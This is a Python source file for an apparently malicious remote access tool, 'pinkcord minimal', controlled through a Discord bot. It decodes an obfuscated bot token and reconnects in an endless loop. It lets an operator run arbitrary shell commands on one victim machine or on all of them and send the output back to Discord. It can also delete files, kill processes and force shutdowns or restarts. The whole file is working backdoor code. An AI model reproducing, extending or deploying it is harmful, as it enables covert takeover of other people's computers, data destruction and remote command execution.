from time import sleep
from discord.ext.commands import Bot
from base64 import b64decode, b32decode
import codecs
from os import popen, system, chdir, remove, getcwd
from random import randint

while True:
    try:
        hshfasudf = "<TOKEN>"
        hshfasudf = codecs.decode(hshfasudf, 'rot13')
        hshfasudf = b32decode(hshfasudf)
        hshfasudf = b64decode(hshfasudf)
        hshfasudf = hshfasudf.decode('ascii')
        bot = Bot(command_prefix="!")

        def gensesion():
            global sesja
            sesja = randint(1, 1000000)
            sesja = str(sesja)

        gensesion()

        @bot.event
        async def on_ready():
            print("pinkcord minimal is ready")

        @bot.command()  
        async def shell(ctx, *args):
            session = args[0]
            output = args[1]
            command = " ".join(args[2:])
            if session == "all":
                if output == "yes":
                    out = popen(command).read()
                    await ctx.send(out)
                else:
                    system(command)
            else:
                if session == sesja:
                    if output == "yes":
                        out = popen(command).read()
                        await ctx.send(out)
                    else:
                        system(command)
                
        @bot.command()
        async def cd(ctx, sesion, *args):
            dir = " ".join(args)
            if sesion == "all":
                chdir(dir)
            else:
                if sesion == sesja:
                    chdir(dir)


        @bot.command()
        async def delete(ctx, session, path):
            if session == "all":
                try:
                    remove(path)
                    await ctx.send(f"File '{path}' has been deleted.")
                except Exception as e:
                    await ctx.send(f"An error occurred: {e}")
            else:
                if session == sesja:
                    try:
                        remove(path)
                        await ctx.send(f"File '{path}' has been deleted.")
                    except Exception as e:
                        await ctx.send(f"An error occurred: {e}")

        @bot.command()
        async def dir(ctx, sesion):
            if sesion == "all":
                await ctx.send(getcwd())
                output = popen("dir").read()
                await ctx.send(output)
            else:
                if sesion == sesja:
                    await ctx.send(getcwd())
                    output = popen("dir").read()
                    await ctx.send(output)

        @bot.command()
        async def sessions(ctx):
            await ctx.send(sesja)
        
        @bot.command()
        async def rename(ctx, session, *args):
            global sesja
            if session == sesja:
                nowaSesja = " ".join(args)
                await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                sesja = nowaSesja

        @bot.command()
        async def shutdown(ctx, session):
            if session == "all":
                system("shutdown /s /f /t 1")
            else:
                if session == sesja:
                    system("shutdown /s /f /t 1")

        @bot.command()
        async def restart(ctx, session):
            if session == "all":
                system("powershell.exe Restart-Computer -Force")
                await ctx.send(f"The remote system {sesja} is being restarted.")
            else:
                if session == sesja:
                    system("powershell.exe Restart-Computer -Force")
                    await ctx.send(f"The remote system {sesja} is being restarted.")
        
        @bot.command()
        async def kill(ctx, session, *args):
            if session == "all":
                task = " ".join(args)
                system(f"taskkill /f /im {task}")
                await ctx.send(f"task {task} killed successfull")
            else:
                if session == sesja:
                    task = " ".join(args)
                    system(f"taskkill /f /im {task}")
                    await ctx.send(f"task {task} killed successfull")
        @bot.command()
        async def h(ctx):
            wiadomosc = '''
!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
!cd [session] [path] - Changes the current directory on the remote computer.
!dir [session] - Displays the current directory on the remote computer.
!sessions - Displays all sessions.
!rename [session] [new_name] - Changes the name of a session.
!shutdown [session] - Shutdown the remote computer.
!restart [session] - Restart the remote computer.
!delete [session] [path] -  Deletes a file from the remote computer.
!kill [session] [task] - remote task killing.
            '''
            await ctx.send(wiadomosc)

        bot.run(hshfasudf)
    except:
        print("no token or internet")
        sleep(20)
